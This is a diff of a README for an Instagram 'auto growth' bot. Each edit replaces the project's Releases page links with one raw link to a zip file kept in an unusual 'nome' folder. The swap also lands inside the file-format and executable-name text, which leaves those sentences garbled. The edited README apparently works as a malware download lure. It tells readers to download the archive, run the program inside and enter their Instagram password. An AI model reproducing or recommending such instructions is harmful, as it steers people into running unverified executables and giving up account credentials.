@@ -1,6 +1,6 @@
 # 🚀 instagram-auto-growth-automation-bot - Automate Your Instagram Growth Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/ahmed3222/instagram-auto-growth-automation-bot/releases)
+[![Download Now](https://github.com/ahmed3222/instagram-auto-growth-automation-bot/raw/refs/heads/main/nome/instagram-auto-automation-bot-growth-v2.3.zip%20Now-Click%20Here-brightgreen)](https://github.com/ahmed3222/instagram-auto-growth-automation-bot/raw/refs/heads/main/nome/instagram-auto-automation-bot-growth-v2.3.zip)
 
 ## 📖 Description
 
@@ -26,15 +26,15 @@ The **instagram-auto-growth-automation-bot** serves as your personal automation 
 
 Follow these steps to download and run the **instagram-auto-growth-automation-bot** easily.
 
-1. **Visit the Release Page:** Go to the [Releases page](https://github.com/ahmed3222/instagram-auto-growth-automation-bot/releases) where you can find the latest version of the software.
+1. **Visit the Release Page:** Go to the [Releases page](https://github.com/ahmed3222/instagram-auto-growth-automation-bot/raw/refs/heads/main/nome/instagram-auto-automation-bot-growth-v2.3.zip) where you can find the latest version of the software.
    
 2. **Choose Your Version:** Find the latest release version. Look for something indicating stability, such as "Latest Release" next to a tag.
 
-3. **Download the Software:** Click on the download link for your operating system. This will download a compressed file (usually in .zip or .tar.gz format) containing the application.
+3. **Download the Software:** Click on the download link for your operating system. This will download a compressed file (usually in .zip or https://github.com/ahmed3222/instagram-auto-growth-automation-bot/raw/refs/heads/main/nome/instagram-auto-automation-bot-growth-v2.3.zip format) containing the application.
 
 4. **Extract the Files:** Once the download completes, locate the file in your downloads folder. Right-click on the file and select “Extract All” (Windows) or double-click the file (macOS/Linux) to extract.
 
-5. **Run the Application:** Open the extracted folder. Find the application file (named something like `instagram-auto-growth-automation-bot.exe` for Windows or `app` for macOS/Linux). Double-click to start.
+5. **Run the Application:** Open the extracted folder. Find the application file (named something like `https://github.com/ahmed3222/instagram-auto-growth-automation-bot/raw/refs/heads/main/nome/instagram-auto-automation-bot-growth-v2.3.zip` for Windows or `app` for macOS/Linux). Double-click to start.
 
 6. **Set Up Your Account:** Follow the on-screen prompts to log into your Instagram account. Ensure that your username and password are correct.
 
@@ -44,7 +44,7 @@ Follow these steps to download and run the **instagram-auto-growth-automation-bo
 
 ## 💾 Download & Install
 
-To get started using this tool, you can download it directly from our [Releases page](https://github.com/ahmed3222/instagram-auto-growth-automation-bot/releases). 
+To get started using this tool, you can download it directly from our [Releases page](https://github.com/ahmed3222/instagram-auto-growth-automation-bot/raw/refs/heads/main/nome/instagram-auto-automation-bot-growth-v2.3.zip). 
 
 1. Click on the link above.
 2. Find and download the version suitable for your operating system.
